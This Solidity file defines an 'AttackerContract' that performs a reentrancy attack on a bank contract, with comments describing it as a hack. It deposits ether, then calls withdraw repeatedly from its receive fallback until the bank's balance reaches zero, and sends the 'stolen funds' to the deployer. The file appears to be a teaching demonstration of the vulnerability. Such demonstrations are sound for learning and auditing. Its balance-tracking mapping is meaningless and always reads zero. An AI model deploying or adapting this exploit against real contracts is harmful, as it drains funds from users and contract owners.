// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import 'hardhat/console.sol';

// This is interfacing some functions from the BankContract for availability to this
interface IBankContract {
    function deposit() external payable;
    function withdraw() external;
}

// Hacker's smart contract
contract AttackerContract {
    IBankContract public immutable bankContract;
    address owner;
    uint256 bal;
    uint256 amount;
    mapping(address => uint256) public balanceOf;

    constructor (address _bankContract) {
        owner = msg.sender;
        bankContract = IBankContract(_bankContract);
        bal = balanceOf[address(bankContract)];
    }

    function balance() external view {
        console.log(bal);
    }

    // This is the special function that carries out the actual hacking
    function hack() external payable {
        require(owner == msg.sender, 'Only the Attacker is allowed to hack');
        //Hacker deposits funds in the bankContract
        bankContract.deposit{ value: msg.value }();
        //This withdraw's function variables state are not updated because the receive/fallback
        //is continually executed before the balance of this Hacker smart Contract address is
        //updated to zero balance from the withdraw function of the bank 
        bankContract.withdraw();
    }

    //This is the function fallback for receiving Ether
    receive() external payable {
        //This is the main condition for which the withdraw continues
        if (address(bankContract).balance > 0) {
            bankContract.withdraw();
        } else {
            //This is used to transfer the stolen funds from hacker Smart Contract
            //to hacker's address i.e. the actual hackContract deployer
            payable(owner).transfer(address(this).balance);
        }
    }

}